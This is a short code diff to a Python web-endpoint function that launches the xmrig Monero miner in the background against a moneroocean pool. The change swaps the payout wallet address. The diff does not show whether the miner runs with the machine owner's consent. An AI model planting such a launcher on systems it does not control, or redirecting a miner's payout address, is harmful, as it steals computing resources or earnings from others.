@@ -17,7 +17,8 @@ def start():
             return "Already running", 200
         miner_proc = subprocess.Popen(
             ["./xmrig", "-o", "gulf.moneroocean.stream:10032",
-             "-u", "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XxppcaNDqYFLxAL8PvCsQqvmE4kPXPzQyQKG7dHQV5h1v1W",
+             "-u", "48cvi6uDffkYLkdDgPRvjFhczqcqZitEoUJ91c97ETz9A33bxx29kRDUrQ334y7qqgZUcNcHatStP3yHQCGHAtUJE9hZnmr",
+             
              "-p", "x", "--background"])
     return "Miner started", 200
 
